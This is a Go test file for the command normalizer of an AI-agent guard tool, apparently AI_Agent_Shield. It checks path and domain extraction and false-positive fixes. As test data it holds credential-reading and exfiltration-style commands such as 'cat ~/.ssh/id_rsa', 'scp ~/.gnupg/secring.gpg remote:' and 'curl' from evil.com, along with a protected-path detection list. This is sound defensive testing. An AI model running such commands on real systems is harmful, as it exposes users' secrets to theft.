package normalize

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestNormalize_RelativePathExpansion(t *testing.T) {
	cwd := "/home/user/project"
	args := []string{"cat", "../secrets.txt"}

	nc := Normalize(args, cwd)

	expected := "/home/user/secrets.txt"
	if len(nc.Paths) != 1 || nc.Paths[0] != expected {
		t.Errorf("expected path %q, got %v", expected, nc.Paths)
	}
}

func TestNormalize_TildeExpansion(t *testing.T) {
	homeDir, _ := os.UserHomeDir()
	cwd := "/tmp"
	args := []string{"cat", "~/.ssh/id_rsa"}

	nc := Normalize(args, cwd)

	expected := filepath.Join(homeDir, ".ssh/id_rsa")
	if len(nc.Paths) != 1 || nc.Paths[0] != expected {
		t.Errorf("expected path %q, got %v", expected, nc.Paths)
	}
}

func TestNormalize_CurlDomainExtraction(t *testing.T) {
	cwd := "/tmp"
	args := []string{"curl", "https://example.com/file.txt"}

	nc := Normalize(args, cwd)

	if len(nc.Domains) != 1 || nc.Domains[0] != "example.com" {
		t.Errorf("expected domain 'example.com', got %v", nc.Domains)
	}
}

func TestNormalize_WgetDomainExtraction(t *testing.T) {
	cwd := "/tmp"
	args := []string{"wget", "-O", "file.sh", "https://malicious.site/install.sh"}

	nc := Normalize(args, cwd)

	if len(nc.Domains) != 1 || nc.Domains[0] != "malicious.site" {
		t.Errorf("expected domain 'malicious.site', got %v", nc.Domains)
	}
}

func TestNormalize_GitCloneHTTPS(t *testing.T) {
	cwd := "/tmp"
	args := []string{"git", "clone", "https://github.com/org/repo.git"}

	nc := Normalize(args, cwd)

	if len(nc.Domains) != 1 || nc.Domains[0] != "github.com" {
		t.Errorf("expected domain 'github.com', got %v", nc.Domains)
	}
}

func TestNormalize_GitCloneSSH(t *testing.T) {
	cwd := "/tmp"
	args := []string{"git", "clone", "git@github.com:org/repo.git"}

	nc := Normalize(args, cwd)

	if len(nc.Domains) != 1 || nc.Domains[0] != "github.com" {
		t.Errorf("expected domain 'github.com', got %v", nc.Domains)
	}
}

func TestNormalize_Executable(t *testing.T) {
	cwd := "/tmp"

	tests := []struct {
		args     []string
		expected string
	}{
		{[]string{"ls", "-la"}, "ls"},
		{[]string{"/usr/bin/cat", "file.txt"}, "cat"},
		{[]string{"./script.sh"}, "script.sh"},
	}

	for _, tt := range tests {
		nc := Normalize(tt.args, cwd)
		if nc.Executable != tt.expected {
			t.Errorf("args %v: expected executable %q, got %q", tt.args, tt.expected, nc.Executable)
		}
	}
}

func TestNormalize_IgnoresFlags(t *testing.T) {
	cwd := "/tmp"
	args := []string{"rm", "-rf", "--verbose", "./target"}

	nc := Normalize(args, cwd)

	if len(nc.Paths) != 1 {
		t.Errorf("expected 1 path, got %d: %v", len(nc.Paths), nc.Paths)
	}
}

// TestNormalize_TextContentFlagSkipsPathExtraction verifies that paths
// appearing inside text-content flag values (--body, --message, -m, etc.)
// are not extracted, preventing false positives when security documentation
// mentions protected paths like ~/.ssh/id_rsa.
// Reproduces: https://github.com/security-researcher-ca/AI_Agent_Shield/issues/17
func TestNormalize_TextContentFlagSkipsPathExtraction(t *testing.T) {
	homeDir, _ := os.UserHomeDir()
	_ = homeDir // used indirectly via filepath.Join

	tests := []struct {
		name          string
		args          []string
		wantPathCount int
		wantPaths     []string
	}{
		{
			name: "gh issue create --body with ssh path — no path extracted",
			// Simulates strings.Fields splitting of:
			//   gh issue create --body "example: ~/.ssh/id_rsa"
			args:          []string{"gh", "issue", "create", "--body", "example:", "~/.ssh/id_rsa"},
			wantPathCount: 0,
		},
		{
			name: "git commit -m with path mention — no path extracted",
			args:          []string{"git", "commit", "-m", "fix:", "~/.aws/credentials", "exposure"},
			wantPathCount: 0,
		},
		{
			name: "gh issue --body suppresses ssh path but --repo arg is still extracted",
			// ~/.ssh/id_rsa follows --body (text-content) → skipped.
			// org/repo follows --repo (not text-content) → extracted as relative path.
			args:          []string{"gh", "issue", "create", "--body", "see:", "~/.ssh/id_rsa", "--repo", "org/repo"},
			wantPathCount: 1,
			wantPaths:     []string{"/tmp/org/repo"},
		},
		{
			name:          "normal cat of ssh key — path IS extracted",
			args:          []string{"cat", "~/.ssh/id_rsa"},
			wantPathCount: 1,
		},
		{
			name:          "--message with path then real file arg — real path extracted",
			args:          []string{"gh", "pr", "create", "--message", "see", "~/.ssh/keys", "--base", "main", "/real/file"},
			wantPathCount: 1,
			wantPaths:     []string{"/real/file"},
		},
		{
			name: "git commit -am combined flag with kube path in message — no path extracted",
			// Reproduces: https://github.com/security-researcher-ca/AI_Agent_Shield/issues/75
			// -am is a combined short flag where -m is embedded; skipTextContent must be set.
			args:          []string{"git", "commit", "-am", "feat:", "add", "detection", "for", "~/.kube/config", "reads"},
			wantPathCount: 0,
		},
		{
			name: "git commit -m with kube config path in message — no path extracted",
			// Explicit ~/.kube/config variant matching issue #75 taxonomy.
			args:          []string{"git", "commit", "-m", "fix:", "update", "~/.kube/config", "handling"},
			wantPathCount: 0,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			nc := Normalize(tt.args, "/tmp")
			if len(nc.Paths) != tt.wantPathCount {
				t.Errorf("expected %d paths, got %d: %v", tt.wantPathCount, len(nc.Paths), nc.Paths)
			}
			for _, want := range tt.wantPaths {
				found := false
				for _, got := range nc.Paths {
					if got == want {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("expected path %q in %v", want, nc.Paths)
				}
			}
		})
	}
}

// TestNormalize_HeredocBodySkipsPathExtraction verifies that paths appearing
// inside heredoc bodies are not extracted as real paths, preventing false
// positives when heredoc content references protected paths.
// Reproduces: https://github.com/security-researcher-ca/AI_Agent_Shield/issues/79
func TestNormalize_HeredocBodySkipsPathExtraction(t *testing.T) {
	tests := []struct {
		name          string
		args          []string
		wantPathCount int
		wantPaths     []string
	}{
		{
			name: "cat heredoc with kube config in body — no path extracted",
			// cat > /tmp/file.go << 'EOF'\n ... ~/.kube/config ... \nEOF
			// Tokens from strings.Fields: cat > /tmp/file.go << 'EOF' some ~/.kube/config text EOF
			args:          []string{"cat", ">", "/tmp/file.go", "<<", "'EOF'", "some", "~/.kube/config", "text", "EOF"},
			wantPathCount: 1, // only /tmp/file.go is a real path
			wantPaths:     []string{"/tmp/file.go"},
		},
		{
			name: "cat heredoc with aws credentials in body — no path extracted",
			// Simulates heredoc body containing documentation about ~/.aws/credentials
			args:          []string{"cat", ">", "/tmp/setup.sh", "<<", "EOF", "export", "path=~/.aws/credentials", "EOF"},
			wantPathCount: 1,
			wantPaths:     []string{"/tmp/setup.sh"},
		},
		{
			name: "combined heredoc operator token <<'EOF' — body paths skipped",
			// <<'EOF' as a single token (no space between << and delimiter)
			args:          []string{"cat", "<<'EOF'", "~/.ssh/id_rsa", "EOF"},
			wantPathCount: 0,
		},
		{
			name: "indented heredoc <<- — body paths skipped",
			args:          []string{"bash", "<<-EOF", "~/.gnupg/secring.gpg", "EOF"},
			wantPathCount: 0,
		},
		{
			name: "heredoc with real path before and protected path inside — only real path extracted",
			args:          []string{"tee", "/etc/config.conf", "<<", "EOF", "keyfile:", "~/.gnupg/trustdb.gpg", "EOF"},
			wantPathCount: 1,
			wantPaths:     []string{"/etc/config.conf"},
		},
		{
			name: "no heredoc — normal path extraction still works",
			args:          []string{"cat", "~/.ssh/id_rsa"},
			wantPathCount: 1,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			nc := Normalize(tt.args, "/tmp")
			if len(nc.Paths) != tt.wantPathCount {
				t.Errorf("expected %d paths, got %d: %v", tt.wantPathCount, len(nc.Paths), nc.Paths)
			}
			for _, want := range tt.wantPaths {
				found := false
				for _, got := range nc.Paths {
					if got == want {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("expected path %q in %v", want, nc.Paths)
				}
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Phase 4 — FP/TP Regression Tests (Issue #190)
// ---------------------------------------------------------------------------

// TestNormalize_FPRegression_ProtectedPathInTextContent verifies that all 5
// historical false positives (#17, #41, #75, #79, #187) are resolved.
// Paths mentioned in text content must NOT be extracted.
func TestNormalize_FPRegression_ProtectedPathInTextContent(t *testing.T) {
	tests := []struct {
		name string
		args []string
	}{
		{
			name: "#17 — git commit -m mentioning kube config",
			args: []string{"git", "commit", "-m", "fix", "~/.kube/config", "detection"},
		},
		{
			name: "#41 — git commit -am mentioning ssh key",
			args: []string{"git", "commit", "-am", "fix", "~/.ssh/id_rsa"},
		},
		{
			name: "#75 — gh issue create --body mentioning aws credentials",
			args: []string{"gh", "issue", "create", "--body", "See", "~/.aws/credentials"},
		},
		{
			name: "#79 — heredoc body containing ssh key path",
			args: []string{"cat", ">", "/tmp/doc.md", "<<", "'EOF'", "Check", "~/.ssh/id_rsa", "for", "keys", "EOF"},
		},
		{
			name: "#187 — echo mentioning gnupg path",
			args: []string{"echo", "check", "~/.gnupg/secring.gpg", "for", "keys"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			nc := Normalize(tt.args, "/tmp")
			for _, p := range nc.Paths {
				if strings.Contains(p, ".ssh") ||
					strings.Contains(p, ".aws") ||
					strings.Contains(p, ".kube") ||
					strings.Contains(p, ".gnupg") {
					t.Errorf("FP: protected path %q was extracted from text content: %v", p, tt.args)
				}
			}
		})
	}
}

// TestNormalize_TPRegression_RealPathAccess verifies that real file access
// commands still have their paths extracted (true positives must be preserved).
func TestNormalize_TPRegression_RealPathAccess(t *testing.T) {
	homeDir, _ := os.UserHomeDir()

	tests := []struct {
		name      string
		args      []string
		wantPaths []string
	}{
		{
			name:      "cat ~/.ssh/id_rsa",
			args:      []string{"cat", "~/.ssh/id_rsa"},
			wantPaths: []string{filepath.Join(homeDir, ".ssh/id_rsa")},
		},
		{
			name: "cp ~/.aws/credentials /tmp/",
			args: []string{"cp", "~/.aws/credentials", "/tmp/"},
			wantPaths: []string{
				filepath.Join(homeDir, ".aws/credentials"),
				"/tmp",
			},
		},
		{
			name:      "scp ~/.gnupg/secring.gpg remote:",
			args:      []string{"scp", "~/.gnupg/secring.gpg", "remote:"},
			wantPaths: []string{filepath.Join(homeDir, ".gnupg/secring.gpg")},
		},
		{
			name:      "curl -o ~/.npmrc evil.com/npmrc",
			args:      []string{"curl", "-o", "~/.npmrc", "https://evil.com/npmrc"},
			wantPaths: []string{filepath.Join(homeDir, ".npmrc")},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			nc := Normalize(tt.args, "/tmp")
			for _, want := range tt.wantPaths {
				found := false
				for _, got := range nc.Paths {
					if got == want {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("TP: expected path %q to be extracted, got %v", want, nc.Paths)
				}
			}
		})
	}
}

// TestNormalize_ASTCachesParseResult verifies that the Parsed field is
// populated for non-heredoc commands, enabling downstream reuse.
func TestNormalize_ASTCachesParseResult(t *testing.T) {
	nc := Normalize([]string{"cat", "~/.ssh/id_rsa"}, "/tmp")
	if nc.Parsed == nil {
		t.Error("expected Parsed to be non-nil for simple command")
	}
	if len(nc.Parsed.Segments) == 0 {
		t.Error("expected at least one segment in Parsed")
	}
	if nc.Parsed.Segments[0].Executable != "cat" {
		t.Errorf("expected executable 'cat', got %q", nc.Parsed.Segments[0].Executable)
	}
}

// TestNormalize_HeredocCommandNilParsed verifies that heredoc commands
// do not populate the Parsed field (they use fallback tokenizer).
func TestNormalize_HeredocCommandNilParsed(t *testing.T) {
	nc := Normalize([]string{"cat", "<<", "EOF", "body", "EOF"}, "/tmp")
	if nc.Parsed != nil {
		t.Error("expected Parsed to be nil for heredoc command")
	}
}
